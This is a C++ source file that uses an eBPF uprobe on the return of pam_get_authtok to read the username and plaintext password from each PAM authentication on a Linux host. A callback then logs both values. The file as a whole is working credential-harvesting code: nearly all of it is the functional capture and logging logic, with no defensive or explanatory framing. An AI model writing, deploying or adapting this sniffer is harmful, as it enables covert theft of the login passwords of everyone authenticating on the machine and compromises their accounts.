#include "pam_task.h"

#include <string>

#include <spdlog/spdlog.h>

#include "../bpf_task.h"
#include "../path.h"

static const std::string BPF = R"(
#include <uapi/linux/ptrace.h>
typedef struct {
  int pid;
  char comm[16];
  int cpu;
  char authtok[20];
  char user[20];
} pam_event_t; 

BPF_PERF_OUTPUT(events);

typedef struct
{
  char *authtok;
  unsigned caller_is;
  void *pam_conversation;
  char *oldauthtok;
  char *prompt; /* for use by pam_get_user() */
  char *service_name;
  char *user;
  char *rhost;
  char *ruser;
  char *tty;
  char *xdisplay;
  char *authtok_type; /* PAM_AUTHTOK_TYPE */
  void *data;
  void *env; /* structure to maintain environment list */
} pam_handle_t;

int after_pam_get_authtok(struct pt_regs *ctx, pam_handle_t* phandle) {
    pam_event_t event = {};
    if (bpf_get_current_comm(&event.comm, sizeof(event.comm)) == 0) {
      bpf_probe_read_str(event.user, 20, phandle->user);
      bpf_probe_read_str(event.authtok, 20, phandle->authtok);
      u64 id = bpf_get_current_pid_tgid();
      event.pid = id >>  32;
      event.cpu = bpf_get_smp_processor_id();
      events.perf_submit(ctx, &event, sizeof(event));
    }
    return 0;
}
)";

static BPFTask<pam_event_t>* t = new BPFTask<pam_event_t>(BPF, "events");

static void callback(void* cb_cookie, void* data, int size) {
    pam_event_t* event = static_cast<pam_event_t*>(data);
    spdlog::info("[PAM_GET_AUTHTOK]: username({}), passwd({})", event->user, event->authtok);
}

BPFTask<pam_event_t>* get_pam_task() {
    t->set_handler(callback);
    auto attach_ret = t->attach_uprobe(PATH_PAM, "pam_get_authtok", "after_pam_get_authtok", 0, BPF_PROBE_RETURN);
    if (attach_ret.code() != 0) {
      spdlog::error("attach_uprobe error: {}", attach_ret.msg());
      delete t;
      return nullptr;
    }
    return t;
}